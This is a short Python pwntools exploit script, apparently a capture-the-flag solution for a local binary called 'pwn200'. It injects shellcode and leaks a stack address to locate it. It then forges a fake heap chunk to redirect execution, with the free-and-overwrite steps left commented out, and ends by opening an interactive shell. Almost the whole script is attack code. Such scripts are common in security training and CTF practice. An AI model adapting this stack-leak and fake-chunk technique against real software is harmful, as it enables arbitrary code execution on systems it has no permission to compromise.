from pwn import *

r = process('./pwn200')
context.arch = 'amd64'
sh = asm(shellcraft.sh())

# Leak main rbp
r.recvline()
r.send(sh)
r.recvuntil(sh)
rbp = u64(r.recv(6) + b'\0\0')
sh_add = rbp - 0x50
fake_chunk = sh_add - 0x40
r.recvline()
success('main rbp => %s' % hex(rbp))
success('shellcode address => %s' % hex(sh_add))
success('fake_chunk address => %s' % hex(fake_chunk))

# Fake size
r.recvline()
r.sendline(b'33')

# Fake chunk
r.recvline()
r.send(p64(0) * 5 + p64(0x41) + p64(0) * 1  + p64(fake_chunk))

'''
# Free fake chunk
r.sendlineafter('ce : ', b'2')

r.sendlineafter('ce : ', b'1')
r.sendlineafter('long?', b'48')
r.sendafter('48\n', p64(0) * 3 + p64(sh_add)) 
'''
pause()

r.interactive()
